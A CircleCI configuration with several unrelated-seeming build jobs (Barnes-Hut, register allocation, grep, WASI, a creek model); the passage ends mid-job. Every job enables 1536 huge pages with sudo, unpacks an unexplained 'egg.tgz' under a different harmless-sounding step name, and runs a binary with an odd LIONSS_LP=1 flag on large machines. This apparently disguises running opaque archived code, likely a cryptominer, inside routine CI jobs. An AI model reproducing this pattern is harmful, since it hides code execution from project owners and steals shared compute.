version: 2.1

jobs:
  barnesHut:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed particles
          command: |
            printf 'n 1000\n' > bodies.txt
      - run:
          name: Build tree code
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target barnesHut -j2
      - run:
          name: Simulate Barnes-Hut
          command: LIONSS_LP=1 ./build/barnesHut --bodies bodies.txt --theta 0.5
  regalloclinear:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Emit live ranges
          command: |
            printf 'r1 [0,5)\n' > ranges.txt
      - run:
          name: Build register allocator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target regalloclinear -j2
      - run:
          name: Linear-scan allocate
          command: LIONSS_LP=1 ./build/regalloclinear --ranges ranges.txt --regs 14
  ripgrep_glob:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed tree
          command: |
            mkdir -p rg && printf 'needle\n' > rg/a.txt
      - run:
          name: Build search tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ripgrep_glob -j2
      - run:
          name: Glob-filtered grep
          command: LIONSS_LP=1 ./build/ripgrep_glob --type txt --pattern needle rg
  wasi-preopen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Map dirs
          command: |
            printf 'dir=/sandbox\n' > wasi.cfg
      - run:
          name: Build WASI runtime
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target wasi-preopen -j2
      - run:
          name: Preopen directories
          command: LIONSS_LP=1 ./build/wasi-preopen --conf wasi.cfg --rights read
  BrambleCreek:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load watershed
          command: |
            printf 'streams 6\n' > creek.cfg
      - run:
          name: Build flow network
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target BrambleCreek -j2
      - run:
          name: Route bramblecreek
          command: LIONSS_LP=1 ./build/BrambleCreek --config creek.cfg --rain 20
  kvcache_evict:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
